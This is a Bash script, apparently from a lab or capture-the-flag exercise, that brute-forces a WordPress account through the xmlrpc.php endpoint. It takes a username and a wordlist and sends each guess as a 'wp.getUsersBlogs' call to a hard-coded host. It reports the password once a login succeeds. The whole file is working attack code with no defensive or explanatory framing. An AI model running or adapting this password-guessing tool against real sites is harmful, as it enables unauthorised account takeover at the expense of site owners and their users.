#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
#S4vitar

# Functions 

function ctrl_c() {
  echo -e "\n\n${redColour}[!] Exiting...${endColour}\n"}]
  tput cnorm; exit 1
}

declare -i c=0

tput civis 

function helpPanel(){
  echo -e "\n${turquoiseColour}[+]${endColour} Use: ${yellowColour}$0${blueColour}-u ${redColour}USER ${blueColour}-w${endColour} ${redColour}WORDLIST_PATH${endColour}"
  echo -e "\t${purpleColour}-u)${endColour} User to try."
  echo -e "\t${purpleColour}-w)${endColour} Wordlist path."
  exit 1 
}

function makeXML(){
  username=$1
  wordlist=$2

  cat $wordlist | while read password; do
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$username</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
    """
  echo $xmlFile > data.xml
  response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)

  if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
    echo -e "\n${turquoiseColour}[+]${endColour} The password of the user ${redColour}$username${endColour} is ${redColour}$password${endColour}"
    tput cnorm; exit 0
  fi
  done
}

#Ctrl + C
trap ctrl_c SIGINT

while getopts "u:w:h" arg; do
  case $arg in
    u) username=$OPTARG && let c+=1;;
    w) wordlist=$OPTARG && let c+=1;;
    h) helpPanel
  esac
done

if [ $c -eq 2 ]; then
  if [ -f $wordlist ]; then
    makeXML $username $wordlist
  else
    echo -e "\n${turquoiseColour}[!]${endColour} The path of the ${redColour}wordlist${endColour} isn't valid."
    exit 1
  fi

else
  helpPanel
fi

tput cnorm
